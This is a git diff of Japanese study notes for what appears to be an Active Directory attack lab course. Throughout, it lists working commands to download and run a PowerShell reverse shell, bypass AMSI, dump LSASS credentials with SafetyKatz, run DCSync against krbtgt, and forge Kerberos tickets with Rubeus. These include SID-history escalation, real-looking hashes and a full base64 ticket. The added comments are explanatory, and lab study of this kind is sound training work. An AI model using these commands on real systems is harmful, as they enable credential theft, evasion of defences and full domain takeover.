@@ -190,9 +190,13 @@ powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicP
 # Port: 443でHTTPSを偽装しFW回避
 ```
 ・HFSを起動しダウンロードさせるファイル(Invoke-PowerShellTcp.ps1)を準備
-・netcatで接続を待ち受け
-```bash
 
+**netcatについて質問！**
+ncについての解説をいれる
+
+・以下のコマンドでnetcatで接続を待ち受け
+```bash
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
 ```
 ・powershellでdcorp-ciセッションが確立される
 
@@ -206,7 +210,7 @@ iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.p
 # New-Object:　新しいオブジェクトを作るコマンド(後続のコマンドをインスタンス化)
 # Net.WebClient.DownloadString:　WebClient起動しURLから文字列を取得する(PowerViewの中身)
 ```
-AMSI（Anti Malware Scan Interface）をバイパスするため次のどちらを行う。
+AMSI（Anti Malware Scan Interface）をバイパスするため次のどちらかを行う。
 
 ① 難読化したコマンド
 ```bash
@@ -244,14 +248,17 @@ iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe
 
 # Loader.exeをターゲット(dcorp-mgmt)に配送.echo Fは上書き確認に対する自動応答。sudo apt install hoge -Yと同じようなもの。-Fはファイルとして保存。-Dはフォルダとして保存
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe	
-
 # $nullは外部コマンド実行時の起動バナー等不要表示を出力しないようにするためにつけている。
+# 先頭が\\ならUNC（リモートサーバ）、\なら現在のドライブのルート、C:ならローカルの絶対パスを示している。
+# C$は隠しディレクトリ。C$はWindows標準の隠し管理共有で管理者権限でのみアクセスできる。用途はリモート管理専用
+
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"	
 
 # SafetyKatzスクリプトをロードしメモリ上で実行。LSASSからKeroberos復号キー取得
-j$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"	
+$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"	
 
 ```
+svcadminのAES256ハッシュを取得
 
 ## クレデンシャルを使用しdcorp-dcにアクセス
 
@@ -259,6 +266,8 @@ j$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127
 ```bash
 # RubeusはKeroberouｓ認証を悪用して権限昇格や横展開を行うツール
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+# -args asktgt はKeroberosのTGTを要求するコマンド
+# /ptt　はPass The Ticketオプションで、取得したTGTをプロセスのセッションにインポートする
 ```
 管理者権限が必要と怒られるので管理者で実行する
 新しいプロンプト画面が表示される
@@ -306,7 +315,8 @@ C:\Users\Public\Loader.exe --obfuscate false -path http://127.0.0.1:8080/SafetyK
 ・DA権限を持つプロンプトに移動
 ```bash
 
-# DCSync攻撃でkrbtgtのハッシュを取得
+# DCSync攻撃(DCの正規レプリケーション(複製)機能を悪用しパスワードハッシュを抽出)でkrbtgtのハッシュを取得
+# レプリケーション機能はDC間でオブジェクトや属性などの情報を同期させフォレスト内の全DCで最新の状態を維持する仕組み
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"		
 
 # ゴールデンチケット偽装（AES256は直前のDCSyncで入手）※変な表示が出るときは再ログインする（チケットが多すぎることによるエラー）
@@ -357,13 +367,18 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 
 # rc4のハッシュを取得
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"		
+# -args lsadump::evasive-trustはDCからドメイン間の信頼キーを抽出するコマンド(evasiveは検知回避のための難読化されたmimikatzのコマンド)
 ```
 新しいコマンドプロンプト画面を起動する
 ```bash
 
 # SIDヒストリを含むチケットを作成
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:bf829c994cc5f43fcbc870c9654bc9d5 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap	
+# sidは現在のドメインのSID。DCsyncやlsadump:: /patchの出力結果でわかる他、Get-DomainSID(PowerView)や(Get-ADDomain).DomainSIDで取得可能
+# sidsは追加するSIDで親ドメインの特権グループを使う。lsadump::evasive-trust /patchコマンドで親ドメインのSIDを確認し、末尾に特定グループのRID(Enterprise Adminなら519)を組み合わせることで作成
 
+
+# 先ほどのコマンドで出力されたチケットを使用する。
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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		
 # 使用しているRC4に間違いがないのにKRBERROR(31)が発生する場合はメールする。
 
@@ -372,8 +387,9 @@ winrs -r:mcorp-dc.moneycorp.local cmd
 set username
 
 set computername
-
+# EnterpriseAdmin権限を掌握
 ```
+ドメインコントローラへのアクセスが完了！
 
 ## krbtgtハッシュ（RC4）を使用した権限昇格（P100）LO-19
 
@@ -389,6 +405,8 @@ set username
 set computername
 # EnterpriesAdmin権限を掌握
 ```
+ドメインコントローラへのアクセスが完了！
+
 追加でDCSync攻撃をする場合は以下のコマンド
 ```bash
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
@@ -397,7 +415,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-
 
 ```
 
-## 外部信頼を悪用(P101)LO-20
+## 外部信頼を悪用し共有リソースにアクセス(P101)LO-20
 
 管理者権限でコマンドプロンプトを起動
 (DA権限を持つプロンプトが起動していれば以下コマンドは省略可能)
